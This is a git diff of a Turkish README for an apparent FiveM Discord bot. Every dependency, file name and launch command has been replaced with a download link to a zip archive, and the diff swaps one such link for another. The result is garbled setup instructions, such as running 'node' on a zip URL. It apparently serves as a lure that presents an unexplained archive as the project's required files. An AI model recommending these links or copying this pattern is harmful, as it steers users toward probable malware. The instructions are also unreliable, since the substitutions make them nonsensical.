@@ -30,14 +30,14 @@ npm install
 ```
 
 2. Gerekli bağımlılıklar:
-- https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip
+- https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip
 - MongoDB
-- https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip v13.17.1
+- https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip v13.17.1
 - Mongoose
 - dotenv
 
 3. Yapılandırma:
-- `https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip` dosyasını düzenleyin:
+- `https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip` dosyasını düzenleyin:
   - Discord bot token
   - Client ID
   - Guild ID
@@ -46,7 +46,7 @@ npm install
 
 4. Botu başlatma:
 ```bash
-node https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip
+node https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip
 ```
 
 ## Proje Yapısı
@@ -55,9 +55,9 @@ node https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/p
 ├── database/          # Veritabanı işlemleri
 ├── events/            # Discord event handlers
 ├── server/            # Komut dosyaları
-├── https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip           # Ana bot dosyası
-├── https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip       # Proje bağımlılıkları
-└── https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip # PM2 yapılandırması
+├── https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip           # Ana bot dosyası
+├── https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip       # Proje bağımlılıkları
+└── https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip # PM2 yapılandırması
 ```
 
 ## Güvenlik
@@ -71,7 +71,7 @@ node https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/p
 - Lisans: ISC
 
 ## Notlar
-- Bot, https://raw.githubusercontent.com/rainesalvo/Fivem-Genel-Yonetim-V13/main/paucijugate/Fivem-Genel-Yonetim-V13.zip v13.17.1 sürümü ile geliştirilmiştir
+- Bot, https://github.com/rainesalvo/Fivem-Genel-Yonetim-V13/raw/refs/heads/main/config/Genel-Fivem-Yonetim-v3.8.zip v13.17.1 sürümü ile geliştirilmiştir
 - MongoDB veritabanı kullanılmaktadır
 - Slash komutları ve sağ tık menüleri destekler
 - Otomatik rol verme sistemi mevcuttur
